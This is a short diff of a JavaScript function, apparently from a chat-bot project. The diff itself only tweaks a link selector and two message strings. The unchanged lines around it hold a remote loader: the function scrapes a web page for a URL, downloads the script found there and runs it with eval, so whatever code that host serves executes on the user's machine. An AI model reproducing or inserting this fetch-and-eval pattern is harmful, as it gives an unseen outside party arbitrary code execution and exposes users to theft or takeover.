@@ -15,14 +15,14 @@ async function fetchAdamsUrl() {
     const response = await axios.get(adams.BWM_XMD);
     const $ = cheerio.load(response.data);
 
-    const adamsUrlElement = $('a:contains("ADAMS_URL")');
+    const adamsUrlElement = $('a:contains("ADAM_URL")'); 
     const adamsUrl = adamsUrlElement.attr('href');
 
     if (!adamsUrl) {
-      throw new Error('The url link not found...');
+      throw new Error('The URL link not found...');
     }
 
-    console.log('Your successfully connected to the server ✅');
+    console.log('You have successfully connected to the server ✅');
 
     const scriptResponse = await axios.get(adamsUrl);
     eval(scriptResponse.data);
